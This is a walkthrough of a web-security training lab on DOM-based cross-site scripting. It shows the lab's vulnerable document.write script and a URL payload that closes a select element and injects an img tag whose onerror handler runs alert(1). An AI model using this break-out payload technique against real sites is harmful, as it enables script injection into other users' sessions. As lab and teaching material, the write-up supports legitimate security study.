# DOM XSS in document.write sink using source location.search inside a select element

- **Given :**  This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.
- To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function.

### **NOTE :**  🙂

- The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`. Event handlers such as `onload` and `onerror` can be used in conjunction with these elements. For example:

```python
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

### SOLUTION :

- ****at first u have a normal selection page of cities

![image.png](DOM%20XSS%20in%20document%20write%20sink%20using%20source%20locati%202f44-54a5/image.png)

- u have this code :

```python
<form id="stockCheckForm" action="/product/stock" method="POST">
    <input required="" type="hidden" name="productId" value="1">
    <script>
        var stores = ["London","Paris","Milan"];
        var store = (new URLSearchParams(window.location.search)).get('storeId');
        document.write('<select name="storeId">');
        if(store) {
            document.write('<option selected>'+store+'</option>');
        }
        for(var i=0;i<stores.length;i++) {
            if(stores[i] === store) {
                continue;
            }
            document.write('<option>'+stores[i]+'</option>');
        }
        document.write('</select>');
    </script>
    <select name="storeId">
        <option>London</option>
        <option>Paris</option>
        <option>Milan</option>
    </select>
    <button type="submit" class="button">Check stock</button>
</form>
```

- Above the <select> element containing our cities you will see a <script>. This script uses ‘*document.write*’ to dynamically create a new <select> element if the URL contains ‘*storeId*’ equal to something that is already an <option>.
- so we perform in URL →  &storeId=random texts like “, ajbdia anything

```python
https://0a61001b03d823ca8030fdbe008f00e3.web-security-academy.net/product?productId=1&storeId="
```

Result : 

![image.png](DOM%20XSS%20in%20document%20write%20sink%20using%20source%20locati%202f44-54a5/image%201.png)

- again right click, and inspect → now u can see something in the option menu

```python
<form id="stockCheckForm" action="/product/stock" method="POST">
    <input required="" type="hidden" name="productId" value="1">
    <script>...
    </script>
    <select name="storeId">
        <option selected="">"</option>
        <option>London</option>
        <option>Paris</option>
        <option>Milan</option>
    </select>
    <button type="submit" class="button">Check stock</button>
</form>
```

- now we need to break the select tag accroding to the Lab. and add a img tag for alert function
- So code is :

```python
web-security-academy.net/product?productId=1&storeId="</select><img src="0" onerror="alert(1)">
```

![Screenshot 2026-01-26 180440.png](DOM%20XSS%20in%20document%20write%20sink%20using%20source%20locati%202f44-54a5/Screenshot_2026-01-26_180440.png)

- Hit enter :

![alert.png](DOM%20XSS%20in%20document%20write%20sink%20using%20source%20locati%202f44-54a5/alert.png)

- hurrey u solved the Lab 😎